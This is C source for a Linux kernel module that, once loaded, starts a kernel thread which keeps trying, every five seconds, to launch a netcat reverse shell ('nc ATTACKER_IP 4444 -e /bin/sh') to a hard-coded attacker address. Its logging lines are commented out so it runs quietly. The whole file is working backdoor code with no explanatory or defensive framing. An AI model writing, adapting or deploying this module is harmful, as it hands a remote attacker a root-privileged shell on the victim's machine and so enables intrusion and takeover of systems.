#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/sched.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/kmod.h>
#include <linux/net.h>
#include <linux/in.h>

#define ATTACKER_IP "192.168.100.1"  
#define ATTACKER_PORT "4444"         
#define RETRY_DELAY 5                

static struct task_struct *reverse_shell_thread;

static int spawn_reverse_shell(void) {
    char *argv[] = {"/usr/bin/nc", ATTACKER_IP, ATTACKER_PORT, "-e", "/bin/sh", NULL};
    char *envp[] = {
        "HOME=/",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/bin",
        NULL,
    };

    struct subprocess_info *sub_info;
    int ret;

    //printk(KERN_INFO "Reverse activado\n");

    sub_info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL, NULL, NULL, NULL);
    if (!sub_info) {
       // printk(KERN_ERR "FAILESD \n");
        return -ENOMEM;
    }

    ret = call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
    if (ret) {
       // printk(KERN_ERR "shell failed: %d\n", ret);
    } else {
        //printk(KERN_INFO "ca a marche\n");
    }

    return ret;
}

static int reverse_shell_thread_fn(void *data) {
    while (!kthread_should_stop()) {
        if (spawn_reverse_shell() == 0) {
            break; // Exit if the shell was successfully spawned
        }
        ssleep(RETRY_DELAY); // Wait before retrying
    }
    return 0;
}

static int __init reverse_shell_init(void) {

    reverse_shell_thread = kthread_run(reverse_shell_thread_fn, NULL, "reverse_shell_thread");
    if (IS_ERR(reverse_shell_thread)) {
        return PTR_ERR(reverse_shell_thread);
    }

    return 0;
}

static void __exit reverse_shell_exit(void) {

    if (reverse_shell_thread) {
        kthread_stop(reverse_shell_thread);
    }

}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("chmoll");
MODULE_DESCRIPTION("Reverse hell");
MODULE_VERSION("1i000.0");


